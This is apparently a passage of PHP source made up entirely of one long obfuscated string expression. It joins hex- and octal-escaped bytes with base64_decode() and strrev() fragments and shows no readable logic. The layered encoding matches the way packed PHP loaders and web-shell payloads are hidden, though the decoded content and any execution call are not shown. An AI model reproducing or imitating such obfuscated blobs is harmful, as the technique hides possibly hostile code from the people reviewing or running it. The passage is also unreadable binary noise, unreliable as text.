f\xca\x5c\xc8\x7c\x24\x5d\xc9\x36\x57\xa1\xea\x1a\x19\x45\x1\xf9\x11\x7b\xa9\xf4\x11\x90\xb1\x4a\xa2\x9c\x31\x27\xb3\x1e\xd3\x4d\xd\xac\x6d\x4c\x2b\x94\x78\x29\xee\xd\x11\x1d\x3b\x4f\xcf\x12\x1c\x20\x52\xd3\xc4\x65\xf8\x77\xd2"."\x44\x4a\x28\xc8\x2d\x76\x56\xd1\xb1\x22\x11\xe2\x38\xe8\x7c\x3e\xc5\x4f\xa7\x88\xd3\xe4\x60\x28\x10\x9\xb4\x51\x17\xb6\x95\x8e\xb1\x1a\xa9\x88\x6a\x60\xd5\x60\xbe\x7d\xa1\x3a\x9e\xb\xbc\x4b\xac\x18\x6c\xd1\x77\x13\x8\x19\x7e\xbd"."\230\317\263\73\115\50\165\262\45\53\216\74\64\204\63\105\223\57\166\320\355\134\4\152\336\33\4\54\170\355\200\76\103\224\244\213\256\361\314\173\14\201\127\310\201\117\146\141\171\164\72\10\136\66\351\227\262\32"."\165\133\122\137\127\127\347\254\233\6\376\147\167\60\344\23\115\165\165\145\50\165\165\115\350\177\234\200\116\116\111\207\132\123\300\374\245\214\206\40\224\24\205\124\210\260\371\234\232\57\122\241\7\364\27\362\30\322"."\104\47\372\34\141\77\66\107\122\140\353\110\114\261\267\324\257\245\55\203\102\27\3\70\263\151\30\110\36\140\70\120\313\151\117\322\13\132\200\306\7\32\324\303\233\117\222\235\303\34\254\220\336\54\176\314\105\173"."\x50\x4\x8a\xa7\xe0\x26\x4b\xb3\x7c\x1f\x40\xc1\xca\x98\x60\x55\x87\x0\xe1\xe0\x1\x4a\x46\x82\xcb\x14\x18\x15\x6f\x2e\x51\x32\xd3\x73\x46\xb1\x2c\xb3\x78\x81\xd1\x1e\x56\x52\x25\x12\xca\x68\xa5\x18\x5f\xde\x60\xf4\x78\x16\x43\x7d".strrev('¿Vøÿo!r‡½âãÈ ÉÁOŠÃ¥nP/à"×Ñl¡1	&-f¨21d>û‘Ğ^ƒ‰GÆPÇIëXX”7')."\x69\x9c\xd0\x93\xba\xc6\xd\x3\xca\x1e\xb1\xa0\xb1\x70\xe5\xdb\x63\xe1\x4c\x8a\xc2\xc6\xc0\x64\x47\x56\x14\xe2\xa5\x0\x7c\x33\xdb\xc6\x9c\x97\x8\x5\xd8\x93\x6c\x79\x3c\x49\xe1\x91\x6\x83\x7b\x2d\x69\x63\xe\x8a\x44\x57\x26\xd8"."\x4f\x8b\x70\x5\x6a\x10\x2f\x78\xdc\x75\x11\x2d\x83\xb5\xbe\xa8\x67\x5d\x5\x5d\x4b\x83\x91\x30\x84\x7a\x41\x78\xb0\x32\x98\xa1\x97\x63\x56\x40\x62\xd\x12\xf1\x44\x20\x54\x99\xa0\xef\x3\x10\xa2\x62\x27\xea\x60\x7b\xc7\xd8\xa2\x80"."\32\146\233\16\1\150\125\152\20\22\332\230\127\133\21\10\267\40\275\302\6\22\231\42\131\313\200\173\33\53\204\325\354\7\110\210\156\75\115\362\6\205\140\121\102\320\270\16\7\74\3\20\17\67\125\255\215\320"."\16\354\15\176\377\146\205\227\121\31\231\41\315\124\274\107\123\310\232\366\366\332\163\150\340\74\212\5\33\317\116\240\304\43\123\70\151\272\330\63\7\25\250\303\112\1\145\103\215\346\14\54\240\211\161\11\41\206".base64_decode('7uldyLUfl5VtUftdPuJ/JmVh1B1ZnvkChp2Bex/HK3yBZGJZXPSy0JVIpW0gRnRlAIVvEJACLRBHKQ==')."\xdf\xec\xd6\x46\x1\x5f\x93\xdd\xd3\x5d\x75\x52\x75\x9f\xa\x64\xae\x92\x21\xf5\x44\xa4\x19\xae\xfa\x39\x52\x5f\xa0\x6f\x46\x63\x8d\x4\xa4\xbf\xac\xd2\xa7\xc4\x17\xa8\xa6\x7b\x7a\xc3\x4c\x57\xc3\xc\xa9\x7a\x41\x57\xa4\xdb\xef\x90"."\240\225\222\324\11\244\111\255\106\152\313\350\132\116\161\327\317\204\126\33\215\323\33\134\263\33\245\260\234\222\165\225\344\42\334\223\350\245\226\310\57\174\316\52\46\124\131\324\105\301\2\0\345\272\110\255\26\337".base64_decode('pvXDXESjEuqxoEKEjEiHgahHiXt4iGulA2uxEGGA40rwARzLBd4x6ymXB1ORT2m4ZAikBqOMsKAWeQ==').base64_decode('lvl47o8aA7VRd7eSVOVWbRhH+9EP0j+Fynw1MDr1f4nWRgeYuuLkYHuHkycTaY049o3bK4K8EvISaQ==')."\x79\xb4\xb4\x88\x7d\x7\x88\xc3\xd8\x6b\x3f\xe\xb7\xc1\x6e\x6\xb2\x41\x3b\x5b\x2\x1\x63\xe7\x11\x34\xa\x16\x5c\xa6\x59\xa3\x6b\xc9\x62\x82\x16\x19\xb4\xc4\xa\xc9\xd4\x22\x71\x27\xda\x4e\xe6\x8\x92\xc6\xc4\xd7\x7d\x86\x75\x6a"."\x71\xd\x5a\xa4\x47\xf3\x3\x68\x1e\x43\x28\x6a\x7\x86\xd5\x5a\xda\x86\x61\x53\x27\x4f\xf6\x6\x3a\x58\xaf\x71\x8c\xe1\xfa\xba\x1\x6b\x6c\x5e\x75\x7f\x3e\x35\x30\xaf\xa6\x1a\x66\x5c\x4d\x60\xb8\x14\xda\xbd\xf4\xd1\x27\x4b\x55\xc4"."\257\132\272\167\252\26\137\341\126\311\116\320\115\10\4\325\155\356\334\152\127\155\115\113\13\337\50\272\41\225\131\112\140\165\206\276\30\313\313\266\104\102\24\131\147\176\33\335\100\342\320\107\12\377\165\116\5\243".base64_decode('k8zwJvC/zen2tZMO7x/AgbmgT5a1DNTW9LdUgLB8QV0Zqthk0G9svKPkJakoWbui9AUromQYJVqGVA==').base64_decode('IZApCNKmVEej0STypc1UxAmEuV+vngji9SIGBlCEiRRvbr/sTKG6tgBkpjk811XbMolmRtcblEDGjw==')."\xa3\xf6\x5b\x5d\xb5\xec\xeb\xc3\x1d\x5e\xf0\xc7\x88\xf2\x38\x52\x3c\xba\xf9\x20\xc8\x80\xed\x3a\xbd\x3d\x11\x5f\xc4\xe7\x25\xaa\xf1\x7b\xec\x3f\xee\x80\xf1\xa4\xf\x88\x1a\xea\xf8\x71\xb4\x48\xd0\xb9\xd1\xe1\xba\x3a\xf0\x37\x1b\xfc"."\311\340\57\1\376\222\220\204\243\6\370\167\26\370\3\51\15\0\332\240\104\207\247\307\301\37\110\235\11\176\147\102\254\24\370\233\316\271\110\113\13\57\30\264\326\343\354\0\315\256\124\70\310\322\302\50\134\250"."\40\334\325\307\127\120\306\110\17\37\340\123\5\212\114\347\220\234\145\112\62\302\3\132\360\223\121\35\316\73\70\353\370\364\250\206\366\224\10\17\316\326\12\65\341\270\14\323\322\210\261\150\270\367\77\143\211\323".strrev('ƒZ'."\n".'ˆdn ºë¢™3)\\r. Át1ëÃğş’j?€lQùŠ‘éÑNbÛ¨³™Œúq¡¾­7UÓªk5˜')."\312\110\67\75\201\200\153\41\330\217\347\350\33\21\263\132\203\204\162\334\321\176\310\155\242\224\22\241\337\126\101\5\207\304\302\31\172\144\72\271\256\76\331\304\376\261\301\250\314\223\66\134\102\135\361\203\105\162"."\21\264\211\236\112\256\50\244\171\305\42\302\333\106\200\10\214\66\174\211\52\234\171\303\22\205\262\205\43\111\24\207\357\112\121\341\6\3\262\161\352\171\101\114\23\300\363\135\100\40\112\271\274\213\175\35\256\66"."\xf8\x3a\x53\xb8\xc0\xc\xbf\x8d\x50\x27\xd1\x66\x65\x1\x54\x79\x17\xdc\xd6\xe5\x95\x2c\xbd\x3\xd6\x81\xd0\x10\x62\x6b\x1c\x68\x92\x63\x45\x41\x49\x3b\xa\xf9\xb4\x23\xad\xa6\x1c\xf1\x5c\xc1\x61\xaa\xa9\x14\xfc\xc7\x1\xc6\xd0\x51".base64_decode('SCQdxlDaoaTkYUdJiReoU2q93qHoKcdgMuFIJnRHEhSQ10uOvJJyaACul+odBRA2AEwGf4ZOHHcMqQ==').strrev('Ç>|MêvÄÄbö%˜¥ˆÌX?%˜½‚F1Øu,C‹\\ëÚ:ø/KbÈPç*ğğÕº‘ËC\'›EI').base64_decode('z0/JWeidnPw3nCu44B8SIxSI6EBjPh+6axDUJFwUEd0xjXBhRNNVIPrKlSsSsCcaWsosMR0tETVMUg==').base64_decode('hLqRirAUEjfKMS2t0PQIe6clrppBsNGWueYkHk0AN2IFaHQqJEEgwA6qw9QafL4L3ztz/AJMdDC4Lg==')."\227\154\151\204\10\155\223\240\362\4\1\345\300\331\101\13\203\47\237\61\170\360\51\264\154\276\313\327\325\36\162\241\362\220\175\42\377\66\274\114\325\105\167\4\370\243\114\202\146\210\351\254\26\227\263\61\134\6".base64_decode('v6mT84CrsNd357twHJTmsqakqT5UVsunVbOYtLapMxhGVSmCDC4bShaU9x8yWDDk7H/Ct2IklSE1oQ==').strrev('ˆ¥k0¢ÅBÀ ¡pä’Ê74uĞnóÁ&‹1?£³¶ùˆBsøYa=<%¼yÁÎäÉ)B'."\n".'ƒËt')."\x8c\x36\x1\x38\x23\x35\xf4\xf4\x0\x42\x83\xca\x40\x1d\xe2\xce\x83\x14\xd3\x16\xe8\xe\xf6\x46\xbc\xed\xae\x8a\x48\x14\x28\xdc\x50\x88\x54\x59\x21\x19\x1e\x37\x83\xad\x37\x3a\x70\x1c\x23\xd7\x18\x28\x48\x39\xc\x14\xc6\x8f\x48\xc5"."\x4c\xe5\xa9\x1d\x50\x61\x54\xd4\x27\x14\xd1\xcb\x12\x5\x80\x2f\xdf\x30\x3d\x97\xeb\x50\xb3\x15\x16\xa2\x1f\x40\x3\x49\x45\xa3\x1d\x74\x30\x37\xc\xb2\xf7\x61\x5\x14\x5f\x38\x80\x1a\xa\x56\x29\xfe\xc6\xac\xf8\xc5\x8a\x8\x7d\x19"."\325\124\132\345\154\331\247\120\226\362\124\332\73\134\377\257\122\337\361\124\12\151\125\145\143\214\121\52\103\361\56\22\26\142\22\224\23\16\71\151\32\16\271\350\220\163\272\103\36\322\35\161\55\77\350\110\32\51"."\360\147\70\300\322\13\223\123\131\200\230\225\35\131\300\300\34\71\65\251\72\162\40\240\232\216\341\234\303\150\310\221\105\70\127\0\211\205\6\207\226\322\35\372\40\50\322\310\300\271\61\350\50\311\103\216\122\116".base64_decode('duQaZYeWTjuGVqYcpSHHkJZwmPSMmIpJMUNUOFxZVBODEOyC/4BxyRWMWDGvDlOn3TlNG5JyQ5nkfw==')."\302\307\212\312\166\174\54\224\0\276\247\153\306\240\354\102\132\122\212\156\137\216\130\172\77\101\130\15\65\3\301\150\313\205\202\3\10\64\111\260\355\104\346\274\3\366\234\274\76\375\154\25\244\252\130\61\50\251".strrev('úßğÕ´ĞöòêŞ´ekFM‚Œ¯´ê8 \\ˆ•DKÏcó91ËtÅr¼DÀ¦h œ°\'èep9‰')."\325\62\340\255\103\232\36\127\15\372\346\22\153\372\200\50\154\376\367\231\104\146\370\77\344\342\362\151\132\311\353\377\363\127\205\114\43\12\265\351\371\357\263\363\74\240\243\250\327\234\377\241\243\140\246\230\370\374"."\x19\x41\x32\x5c\x5\x35\x1\x39\xb5\xab\xce\xc5\xef\x55\x90\x58\x43\xe7\x5e\x23\x98\xa5\x43\x8e\x54\x23\x9c\x6a\x43\x60\x9a\xd\x39\x72\xda\x10\x98\xd1\xaa\x43\xcf\xd\xc5\x1d\xb9\xc1\x21\x10\x80\x32\x73\xe\xcc\x43\x10\x56\x80\x48"."\150\224\122\144\356\66\244\353\35\15\351\202\103\6\23\77\256\2\16\240\16\245\34\171\143\310\1\146\77\370\277\144\202\342\300\157\16\310\42\71\50\241\347\200\250\76\244\305\51\333\201\172\275\56\55\17\37\37"."\200\256\371\135\45\370\232\253\143\54\341\272\34\77\203\236\173\55\317\60\362\277\262\1\207\165\302\46\310\241\132\114\60\173\370\257\131\204\255\54\234\54\224\204\153\213\366\60\302\214\234\357\42\255\300\122\42\114"."\160\60\371\223\243\221\314\360\112\46\21\313\152\332\140\261\40\260\2\234\212\167\331\206\253\277\156\332\352\151\3\56\76\275\377\23\46\56\366\77\141\41\306\40\40\361\236\301\350\50\75\366\303\125\44\137\22\62".base64_decode('CHtIzjc5v1wt8svVhNkNWIRfO3EwrgsTYCfQs1DyW8Z1+3WwZxTnVYXdAxG5KDOmb8hbKsIm3w9g2Q==')."\330\274\205\271\133\130\164\216\55\336\226\235\160\31\30\15\12\16\227\361\163\75\221\121\351\305\23\272\1\341\202\177\61\117\267\6\112\122\220\367\101\206\154\122\127\362\302\253\71\240\105\140\207\6\335\273\60\20".base64_decode('6ET+NAb8apPbjVW+4XZ8DjS3mtFIOIUs6GppTIBBcwkHO/2BVg9y6xDrCtDnqJubWwzxhiwDyMkJ6g==').base64_decode('kWbPNvbJOtSDcESIOqBEUiUtz+64yLFZCaPiSLArGPP0RroE1xgMFCSKPOjdbQgJhHxLPdzFFWgYPQ==')."\116\352\353\353\163\302\343\170\150\312\222\100\117\166\267\302\104\11\362\311\134\163\325\240\226\114\144\265\142\262\212\27\350\236\346\252\223\32\353\246\111\275\171\252\66\112\167\117\364\165\366\274\346\24\36\67\264\275"."\317\156\115\264\74\340\113\77\216\223\300\126\3\120\235\260\241\16\14\51\272\140\233\100\37\243\46\277\335\201\105\104\207\271\55\20\44\307\13\335\13\230\72\113\273\122\240\62\165\133\331\53\307\110\3\147\70\227"."\235\303\364\173\204\103\323\271\355\115\5\135\53\244\324\174\122\2\70\171\243\251\275\271\252\335\263\250\251\252\5\44\311\331\54\114\225\334\55\163\335\34\221\214\130\60\24\10\166\370\230\123\214\40\34\2\162\172"."\x46\x9e\x78\xf7\x92\x89\x43\x3e\x65\x51\x61\xaf\x2\x3d\x5d\xc5\x55\xd8\xab\x50\x9d\xaa\x24\xea\x43\xf\x19\xc0\xe0\xe0\xb4\x7a\xe2\xe3\x51\xb4\xbc\x25\xfa\xa3\xd0\xa2\x4d\xe8\x7\x18\x65\xb6\x30\x88\x40\xda\xbd\xd0\xf7\x81\x40\x1e"."\31\166\110\156\63\300\300\100\142\14\330\45\32\3\202\216\200\313\27\274\150\207\275\12\73\46\1\265\216\320\244\301\135\143\111\147\271\322\212\111\256\143\21\34\326\56\351\206\313\222\23\77\120\257\351\43\60\263".base64_decode('Da3iR6nyFPKbIPg4LAqTXBFN2BkLijMbClAkuq+zDTSJhpuriLEgnReQV1a1YLY4N9ykDMNBBU1uCQ==').strrev('ÔVÏI4¬‘vE3E±Np9ìI7ÎÜ-±iUF­ƒŠˆ‚á°¶ì(‘'."\0".'i‹uÍOi4{¥‡ ')."\67\121\211\204\211\165\107\52\116\132\150\340\4\252\326\74\153\106\143\135\235\43\127\64\114\247\256\130\137\171\205\35\45\221\343\305\356\260\23\117\154\347\42\25\360\203\166\152\243\215\174\44\64\111\144\42\70\44".base64_decode('Oj9wKOiJtHU5JESsDqnTGwHgXvAPtk9wSHBeg2Qwzx0StJB2SL09+JdrnIO+w2SBbHpQV4I4pGhKNA==')."\x6e\x12\x25\x49\x70\xc6\x42\x2d\x1b\xd2\xeb\x18\x40\x47\x34\xd7\xd4\xa7\xe6\x1b\xea\xa1\xc2\x39\xb6\x55\x82\xdb\x78\x42\xc\x80\x3b\x16\xf5\x7c\x13\xf6\xd9\x64\x38\x73\x6a\x2\x2c\xfa\x60\xc1\x75\x2\x92\x68\x82\xaa\x7c\xd6\x32\xe8"."\x3d\xe7\xff\xbd\x4\x58\xb\xaa\xf5\xfe\x7f\x2f\x5\xea\x48\x78\x4c\xb0\xc8\xc4\x8b\xa6\x62\xfc\x4f\x65\x50\x6\xc7\xba\xa\x6b\x27\xb5\x90\x55\x61\x9a\x54\x5f\x57\x27\x5\x16\x40\x34\x92\x32\x4e\xc8\x45\x3b\x99\xf0\x2\x3c\x3e\x64"."\21\307\172\31\111\171\210\276\43\233\201\223\114\315\27\250\107\113\304\250\300\300\207\372\102\314\141\235\146\135\16\42\26\156\115\32\226\244\234\232\214\66\124\330\117\302\75\10\310\73\302\332\1\327\366\41\5\246".base64_decode('0c7CmJiVJZvQVzAXY2ALIigQY4JJni0aoDCOjdMYehKuQy1qHj4+ayLehiEMQSvlFTrpYX5ozOdGQA==')."\x37\x67\xcc\x30\x1f\x46\x64\xf9\x88\x7\xd0\x16\x1f\x2e\x5a\x81\x28\x14\x66\x6d\x15\xb4\xf3\x6a\xa1\xb3\x42\x2b\xc8\x2b\x8b\xa\x83\x37\xd9\x66\x9\x6b\x33\xca\xc4\xc8\xc0\xd6\x63\x14\xcb\xd2\xb5\x8c\x5c\x70\x91\xf0\x95\x37\x67\x4".strrev('`K#óö'."\r".'JÁ$¨ê'."\0".'¸w§bàá±X]/2±Y\\ñ1Äòc 8£.KPÉø	Úè$š!^< 3ƒ}')."\367\62\154\136\202\157\365\152\153\234\64\300\134\72\221\113\40\342\265\140\10\55\123\204\111\103\141\225\204\207\300\174\200\256\137\223\323\354\200\172\212\255\245\122\360\264\202\304\10\26\332\156\322\54\170\57\111\143"."\x85\xac\x9c\x57\xc\x1a\x3\x59\x45\xb9\x77\x91\x98\x71\x91\x35\x23\x43\xa5\xc9\xc2\xd1\xbb\x58\xf5\x18\x16\x94\x9\x64\x38\x56\x50\xb2\xf8\x2c\x5\xec\x56\x0\xa9\x12\xf8\xc8\x18\xf0\x44\x56\x87\xbe\xe3\x92\x62\x5c\xcd\xc1\x1b\x48"."\231\125\122\7\22\75\340\106\203\24\47\255\53\112\336\2\211\147\213\212\5\40\147\13\31\31\101\60\200\74\35\321\26\167\267\245\335\155\272\273\215\354\304\361\53\146\173\356\111\222\311\252\105\274\142\321\7\47"."\120\3\361\106\33\272\321\111\253\251\212\160\270\125\250\230\120\240\122\35\352\155\42\132\51\334\372\1\236\131\306\240\51\120\214\37\155\224\135\42\241\62\103\232\311\226\131\341\43\360\6\34\135\164\20\146\301\237"."\43\205\70\251\54\125\373\362\165\167\306\72\374\276\140\14\355\3\2\75\21\217\337\226\0\30\153\304\327\126\6\156\15\120\207\275\266\246\305\163\126\265\64\65\217\144\201\40\367\367\3\242\262\301\34\326\22\77"."\220\44\17\264\37\300\301\71\163\343\272\233\132\127\306\205\135\221\221\223\263\134\353\211\352\264\273\215\42\221\43\210\347\30\277\217\114\60\67\331\43\372\325\70\265\157\152\363\57\5\115\200\16\76\2\41\117\150"."\x9\xf7\x58\xc\x52\x22\x9e\xd0\x18\x29\x30\xf\xf1\x13\x48\x5d\xd7\xcd\x99\x3f\x7f\x3e\x7d\x60\x34\x91\xc5\x16\x9b\xd0\x8e\x80\xdd\xb9\x3\x28\x3c\xc1\x52\xca\xa1\x72\x39\x26\x54\xd3\x43\x66\x4e\x96\x3b\xfb\x90\xac\x7b\x70\xb\x2a"."\44\56\125\13\143\44\252\5\372\74\144\201\252\262\27\350\333\2\46\73\222\23\34\367\314\44\277\303\344\67\76\112\137\162\320\211\376\101\102\46\371\125\203\234\261\245\107\241\176\34\15\203\345\50\313\317\102\221".strrev('‡ >uH¸bğoìti2ï²MuHâõ6l”db'."\n".'wÕ‡c–‚->Sm¡º‘Í '."\0".'R˜§ç&Ô€ñâ')."\25\44\63\217\114\167\101\143\200\173\273\40\66\206\56\27\121\4\202\236\4\0\307\261\42\41\267\243\324\373\1\72\172\210\1\146\50\370\260\104\216\262\340\372\203\114\45\54\156\156\26\150\111\62\154\115\330\267"."\115\122\31\236\43\41\27\115\304\61\171\145\137\111\350\63\22\370\14\264\36\223\260\335\257\105\213\20\43\224\101\232\54\312\210\70\241\274\302\223\353\246\325\11\146\37\276\66\157\70\166\174\30\72\72\365\373\250".base64_decode('2xxrgg+kRUJjpHhCY6UEWo8fI6WNbjKsKf5AICx6aLJVrzco+IAkm2i4wE8jmqE9vX7Cv6KEgqOEYQ==')."\267\21\25\251\150\161\162\135\43\265\10\342\257\162\302\276\211\11\257\133\343\143\67\34\326\320\66\16\207\245\204\214\55\147\342\12\26\35\224\44\364\354\12\153\47\31\100\240\246\354\176\42\164\333\354\166\127\273"."\246\326\114\232\230\23\141\321\132\10\214\326\272\47\366\222\152\114\344\60\200\60\211\301\335\313\252\253\126\117\251\161\325\126\107\247\325\60\25\260\50\65\67\213\106\213\104\201\152\140\125\343\32\356\152\62\332\357"."\xaa\x8d\xe\x4c\x12\x34\xd2\x56\x1\xc0\x1a\x6\x28\x65\xe8\x99\x1a\x72\x60\xc1\xb0\x8c\xda\xea\xfe\xaa\x29\x3\xae\xda\xfe\x65\xd1\xe8\x0\xc\xd6\x0\x58\x13\x84\x47\xc3\xae\xda\x1a\xc7\xbc\x49\xee\x5e\xd5\x10\xf1\xb1\x2b\xec\x31"."\x71\x48\x97\x53\x83\xb3\x2\xbb\x20\x80\x72\x8d\xa\xb6\x52\xc8\xdc\x42\x54\xba\xd\x7a\x1\x53\x16\x1c\x78\x98\xb9\x82\x40\xb6\xf8\x2c\x4e\xd4\x5e\xc7\x10\xba\xa4\x14\xe9\xda\x87\x82\xd4\xc2\xab\xc0\xb5\xf8\xad\x1a\xb7\x2c\x6a\x99".strrev('¨@4—ì †3#d‘	ÔA`\\ş	Ô WP¬ğ¸À¢ˆ‚&SÑ1AB©ôíB~WÖF,ç+Ru-')."\166\3\11\117\5\204\205\266\313\346\115\213\354\265\312\373\20\207\1\41\223\251\205\360\300\247\320\346\207\272\53\341\212\343\245\70\351\1\330\307\61\333\7\231\5\167\126\330\263\266\133\145\30\256\311\105\243\124"."\x8e\x4a\xc8\x5\x78\xe7\x93\xc4\xa7\xeb\x39\xfa\xe6\x17\xf\xf5\x6\xa1\xb7\x3a\xc8\x9\x62\xf4\xa0\x55\x0\xf9\x7a\x7c\xb1\xb0\x6f\xa9\xb7\x2c\x1\x3a\x75\xae\x9c\x2\xd6\xfb\x88\x8f\x8a\x3f\x2\xbc\x27\x80\xdc\xc6\x59\xe0\xbd\x3d"."\13\172\2\175\225\120\43\335\101\56\113\10\111\155\236\236\110\114\330\270\342\35\15\330\227\261\55\15\325\152\117\350\211\206\372\70\233\146\314\235\32\25\370\311\114\241\153\76\367\274\60\354\144\112\376\164\123\324"."\xce\x5d\x9d\x90\x6c\xe8\x74\x96\x54\x1\xb9\x7b\x21\x19\xc4\xa3\x1e\x31\xd9\x21\x55\x3c\xe8\x61\xbb\x2e\x62\xed\x61\x3b\xc3\x8c\xab\x79\x99\x3a\xaf\xcd\xd1\x6f\xe7\x98\xc9\x1c\xf4\xf3\x44\xfd\xe4\x20\xf3\x36\x2a\x19\x88\xf7\xdf\x5".strrev('Î}Ö'."\n".'²ıÉÖ íÂG“â‹0“ÆŞàSì%Ÿ+ßZ &˜×ê1i)Ş_QÂàVG_'."\0".'é™X…cîX‰v')."\151\22\153\143\14\227\214\43\123\205\4\254\177\136\301\102\320\346\152\101\360\352\212\314\316\303\305\70\163\160\143\63\351\243\76\143\45\321\230\216\172\176\205\5\240\27\173\140\13\14\61\15\24\13\237\201\346\55"."\23\263\240\157\226\145\301\151\320\346\215\63\67\61\305\200\152\136\275\124\20\253\224\122\341\123\50\111\350\321\4\335\376\121\107\165\244\223\170\137\231\264\277\353\235\364\261\71\321\165\54\261\230\43\235\353\254\227"."\x4\x82\x83\xdc\x48\xa0\x8\x7c\x88\xc1\xba\x91\xdb\x80\x66\x39\x8e\x6\x5d\x44\x28\x7c\xf0\xb9\x8d\x21\x7e\x4e\x88\xd\x2d\x7a\x77\x88\xc5\x74\xc1\xfe\x4c\x49\xd2\xa1\x43\xef\xf6\x54\x5c\x5d\x30\x10\x3d\xec\xd3\x5b\x29\x1d\x77\x16".strrev('Òd¬wQÃ¦;†:Lİ'."\0".')ÑÜ¼\\ —½Â»ZqÑ'."\n".'Ú|Y8Â“+_GM`&'."\0".'!´çx·nL')."\216\150\14\130\356\334\316\305\334\321\22\217\372\140\233\32\366\5\172\252\153\240\334\145\161\65\320\75\302\74\243\203\221\104\53\173\267\74\314\7\212\105\150\52\243\123\303\22\301\376\42\55\271\31\210\141\225\330"."\213\163\224\47\5\273\202\156\6\152\245\335\304\236\270\41\366\325\360\201\1\261\320\0\221\142\113\330\160\212\160\327\46\346\102\223\156\222\112\71\65\41\371\3\235\160\207\336\356\13\57\220\322\212\51\161\321\10".base64_decode('3XdYZz7yGIEHh1J+nGrLoKATHp04k8xC1mC7FtGzJiymYrFUOCgrMQ+vbbNleeBOpgJ2lh+GCMhk5w==')."\x63\xc5\x1f\x51\xe0\xd5\x81\x50\x63\x21\x43\xb1\x42\x6d\x8\x7e\xe5\x2f\xa0\x93\x53\x11\x1b\x1d\x2d\x8d\x55\x79\x35\x3f\xa4\x1a\x2a\x67\xe\x34\xc7\x88\x58\x3a\xf7\xf4\x21\x74\x35\xf4\x36\xc6\xcd\xd1\x59\x17\xb3\xb2\xcb\xcc\xa4\x79".base64_decode('HOOQp88Eg1w8POITgAXqr4Zc21NKIFHhBrygy6qhCADLA4EEP4axMCzk6+yK/NfFqUn+2J+tMmqSSg==').strrev('ª	@¾a‰ğbWË!ª‘&L»t1ÿWàà*…äx˜ÈQa~ãe^İ¯…9Àğ¨RÈXyQ7íÌ')."\x24\xea\xb6\x8b\xcd\x29\x64\x45\x8a\xac\x96\x4\x6f\x48\x6e\x7a\x56\xc9\xdc\x80\xc3\x23\x6b\x2f\xf5\x91\x2\x23\xdc\x50\x95\x3b\x76\xa5\xde\x6d\x61\x1\xe4\x83\xb0\x46\xd8\x78\x59\xd5\xd0\x23\x63\xd4\xc8\x95\xba\x48\xa4\x8d\xc2\x51"."\xbb\x3b\xdc\x8c\x28\x5f\x97\x95\x5\xa5\xef\xb1\xcb\x1\xf9\x24\x6e\xd7\xcf\x10\xa4\x66\xa9\xe\xb9\x87\xe0\x6e\x4d\xa5\xb9\xf4\x31\x2\xfe\x9\xf4\xb2\x9b\x37\x57\xa0\x6f\x5a\x62\x3b\xec\x2e\xd5\xe0\x8f\x8a\x20\x61\x83\x6f\xb3\xa0"."\114\247\345\106\312\0\26\103\177\77\255\6\363\256\12\115\134\362\51\115\154\65\142\162\140\255\160\240\200\27\360\40\34\302\206\336\16\170\136\156\6\21\105\371\225\41\305\132\316\230\205\32\366\145\202\113\57\140".strrev('Ô+…nÄ²Ñ‡’P·è²F'."\r".'¶ó)~J*şÄB¾°¹I‡—è_Óø\\•2.P"(¼ab¬‚!M<®ËCâ')."\x91\xba\x3a\x6c\xcb\x6\xf4\x67\x27\xe7\x19\x87\x82\xe3\x9\x90\xb0\x4b\x24\x10\xe0\xb3\x8a\xa6\x9\xe4\xc3\xbc\x4f\xb1\x3d\x2c\x72\x7\xcb\xce\xb2\xc1\xea\x1d\x1\x1c\x2e\xed\xc0\xf2\x7\xe4\xd\x3c\xd6\x3a\x22\x86\x45\x3f\xbb\xa8"."\136\21\146\266\243\46\331\10\211\367\373\116\232\12\265\325\50\207\340\344\213\123\5\162\146\154\107\314\215\215\5\102\330\211\245\13\373\35\301\51\72\330\106\60\357\264\26\64\302\64\300\346\153\114\17\71\104\46".base64_decode('wN5yinkffoDBAtWFbYro6Rj7BeJe6Qk6+FoQOwIizRaLpM6Y0A/cyIAZy6zI3eXOm6CTTSpiCI5oiQ==')."\117\55\227\270\217\40\10\322\134\211\17\260\145\2\101\61\15\316\112\24\100\263\122\24\66\53\103\55\263\22\241\60\222\103\157\160\62\352\203\75\112\176\332\225\24\23\303\141\234\357\327\304\347\147\60\31\171\230"."\xd4\x42\xb\x47\xbf\x90\x33\x3a\x70\xe3\x1c\x8c\xd2\x55\xc3\x8f\xb4\x3e\x8d\x30\x96\x46\x1d\xf0\xc6\x14\xfc\xe0\x1d\x85\xe1\xe0\xf\xc\x38\xf0\xed\x7\x32\x35\xb2\xd3\x59\x96\x7b\xd0\x2\x5d\xcd\x1b\x7\x6b\x1a\x11\x1b\x6a\x91\x82".base64_decode('7QIw6y1bhpC9RyNauXsL7rUqX8xxR2EgYt0QlDVYaGFRzzqQzrKDvrRo6w6hDjFTaCMTPm0jVaF3/w==')."\x63\xe9\xc4\xad\x2f\x92\xff\x81\xfc\x84\x5d\x84\xe0\xa4\x26\x74\x5b\x54\x19\x4d\xb5\x90\x24\xd8\x80\xf3\x73\x78\xfc\xc0\x6b\xc1\xbe\x38\x2c\xc9\x25\xeb\x1b\xa6\xcf\x16\xb7\xdc\x7c\xe4\xb8\xe7\x21\x72\x3f\x42\xf4\xab\xe8\x79\x23\xa3".base64_decode('BclKaRJ9VVac1CjR6niZvAMsMHUb8/2vZoKnknyOMwnHgqxk3AUsIPQFIlTBn6CwJtkcxmnQit/gHw==').strrev('öjh–/ô‚Éà9ëÕ˜òó\'t™QîTõİgº¾ABè'."\0".'ô7jgÌÍ½ÿÑjTO¡oÖÎŸ'."\n".'ëÆ').base64_decode('4w2YHS556AWEQD5L1lh4e8rnKu9H/KLrf98tVOjH+wbuerBCL7jnU94EWi3uSGSrD7cfaAMWtZgPAA==')."\247\154\72\5\322\26\216\307\24\63\200\10\204\10\60\174\237\145\53\20\40\362\134\3\16\151\54\44\201\20\371\123\163\202\124\5\161\75\246\70\64\145\333\120\312\340\270\22\40\172\223\202\73\225\101\163\331\62"."\xaf\x85\x57\x9d\xc5\x27\x1e\x50\x41\xe2\x34\x29\x2f\x1a\x9d\x6c\x90\xfa\x92\x89\x8d\xb4\x49\x90\xf\x46\x4f\x27\x7b\xb5\x3\x92\x1\xaf\x82\x95\x28\x4c\x8d\xa7\x98\x9a\xf5\xa1\xa1\x0\x3d\x31\x6\xc2\x95\x65\xeb\x4\xe2\xdc\x6a\x4f".base64_decode('YE9JG5D2AOIEnN0BNqQK2x8i03PZGDVUcJhFDl94T3mYPCa+ZQ2ijJjJ0ksYJPKojT8rrKx8EeWhHg==')."\152\330\2\43\302\321\43\332\152\260\304\214\270\13\201\17\245\341\20\25\245\131\55\320\142\120\151\136\341\112\100\242\44\313\73\12\322\5